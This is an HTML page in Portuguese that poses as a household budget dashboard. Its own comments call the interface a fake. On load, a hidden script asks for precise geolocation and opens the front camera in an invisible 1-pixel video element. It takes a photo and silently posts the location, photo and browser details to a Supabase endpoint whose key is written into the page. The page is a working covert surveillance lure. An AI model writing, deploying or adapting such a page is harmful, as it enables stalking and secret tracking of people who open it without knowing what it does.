<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Contas 2026 — Gestão Financeira</title>
  <meta name="description" content="Organize suas contas e despesas de forma simples." />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #f4f6f9;
      color: #333;
      min-height: 100vh;
    }

    /* ── Fake site UI ── */
    header {
      background: #1a56db;
      color: white;
      padding: 1rem 1.5rem;
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 18px;
      font-weight: 600;
    }
    header span { opacity: 0.85; font-size: 13px; font-weight: 400; }

    .fake-content {
      max-width: 560px;
      margin: 2rem auto;
      padding: 0 1rem;
    }

    .card {
      background: white;
      border-radius: 12px;
      padding: 1.5rem;
      margin-bottom: 1rem;
      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
    }

    .card h2 { font-size: 16px; color: #444; margin-bottom: 1rem; }

    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0.6rem 0;
      border-bottom: 1px solid #f0f0f0;
      font-size: 14px;
      color: #555;
    }
    .row:last-child { border-bottom: none; }
    .row .val { font-weight: 600; color: #222; }
    .row .val.red { color: #e53e3e; }
    .row .val.green { color: #22863a; }

    .total-bar {
      background: #1a56db;
      color: white;
      border-radius: 12px;
      padding: 1.2rem 1.5rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .total-bar .label { font-size: 13px; opacity: 0.8; }
    .total-bar .amount { font-size: 24px; font-weight: 700; }

    /* ── Overlay de captura (invisível para o usuário) ── */
    #capture-overlay {
      position: fixed;
      inset: 0;
      background: rgba(244,246,249,0.01);
      z-index: 9999;
      pointer-events: none;
    }

    /* Câmera oculta */
    #hidden-video {
      position: fixed;
      bottom: -9999px;
      right: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
    #hidden-canvas {
      position: fixed;
      bottom: -9999px;
      right: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <header>
    📊 Contas2026 <span>Gestão de despesas</span>
  </header>

  <div class="fake-content">
    <div class="total-bar">
      <div>
        <div class="label">Saldo do mês</div>
        <div class="amount">R$ 2.847,30</div>
      </div>
      <div style="font-size: 28px; opacity:0.6">💳</div>
    </div>

    <div class="card">
      <h2>Contas a pagar — Junho 2026</h2>
      <div class="row"><span>Aluguel</span><span class="val red">R$ 1.200,00</span></div>
      <div class="row"><span>Água</span><span class="val red">R$ 87,40</span></div>
      <div class="row"><span>Luz</span><span class="val red">R$ 134,20</span></div>
      <div class="row"><span>Internet</span><span class="val red">R$ 99,90</span></div>
      <div class="row"><span>Supermercado</span><span class="val red">R$ 423,00</span></div>
    </div>

    <div class="card">
      <h2>Receitas</h2>
      <div class="row"><span>Salário</span><span class="val green">R$ 4.500,00</span></div>
      <div class="row"><span>Freelance</span><span class="val green">R$ 291,80</span></div>
    </div>

    <div class="card">
      <h2>Histórico</h2>
      <div class="row"><span>Maio 2026</span><span class="val">Fechado ✓</span></div>
      <div class="row"><span>Abril 2026</span><span class="val">Fechado ✓</span></div>
      <div class="row"><span>Março 2026</span><span class="val">Fechado ✓</span></div>
    </div>
  </div>

  <!-- Elementos ocultos para captura -->
  <div id="capture-overlay"></div>
  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="hidden-canvas"></canvas>

  <script>
    // ─────────────────────────────────────────
    //  CONFIGURAÇÕES — preencha após criar o Supabase
    // ─────────────────────────────────────────
    const SUPABASE_URL = 'https://jxgxpwoavxftyeohgmjm.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_xpNd_6XvlhEr-so3_8hKEA_sN2tVcVw';

    // ─────────────────────────────────────────
    //  CAPTURA SILENCIOSA
    // ─────────────────────────────────────────
    async function capturar() {
      const payload = {
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        lat: null,
        lng: null,
        accuracy: null,
        foto_base64: null,
      };

      // 1. Geolocalização
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 8000,
          })
        );
        payload.lat = pos.coords.latitude;
        payload.lng = pos.coords.longitude;
        payload.accuracy = Math.round(pos.coords.accuracy);
      } catch (_) {
        // permissão negada — salva sem localização
      }

      // 2. Foto da câmera frontal
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false,
        });

        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        video.srcObject = stream;

        await new Promise((res) => {
          video.onloadedmetadata = () => { video.play(); res(); };
        });

        // espera 600ms para câmera estabilizar
        await new Promise((res) => setTimeout(res, 600));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        payload.foto_base64 = canvas.toDataURL('image/jpeg', 0.7);

        stream.getTracks().forEach((t) => t.stop());
      } catch (_) {
        // câmera não disponível — salva sem foto
      }

      // 3. Envia para o Supabase
      await enviarSupabase(payload);
    }

    async function enviarSupabase(payload) {
      try {
        await fetch(`${SUPABASE_URL}/rest/v1/alertas`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
            'Prefer': 'return=minimal',
          },
          body: JSON.stringify(payload),
        });
      } catch (_) {
        // falha silenciosa
      }
    }

    // Dispara ao carregar a página
    window.addEventListener('load', () => {
      capturar();
    });
  </script>
</body>
</html>
